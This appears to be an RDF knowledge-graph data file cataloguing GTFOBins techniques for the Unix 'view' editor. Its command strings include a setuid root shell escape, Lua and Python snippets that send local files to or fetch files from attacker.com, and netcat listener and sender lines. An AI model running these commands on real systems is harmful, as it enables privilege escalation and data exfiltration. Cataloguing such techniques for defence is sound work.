mknd:command_view-capabilities a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-capabilities" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_capabilities ;
    mknd:value "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'" .

mknd:command_view-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
        "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export LPORT=12345
export LFILE=file_to_save
view -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open(os.getenv("LFILE"), "wb");
  f:write(d);
  io.close(f);'
""",
        """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
""" .

mknd:command_view-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_file-read ;
    mknd:value "view file_to_read" .

mknd:command_view-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
        "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server." ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export LPORT=8888
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
view -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
""",
        """export URL=http://attacker.com/
export LFILE=file_to_send
view -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
""" .

mknd:command_view-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "view-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_view ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_view ;
    mknd:provides mknd:function_file-write ;
    mknd:value """view file_to_write
iDATA
^[
w!
""" .

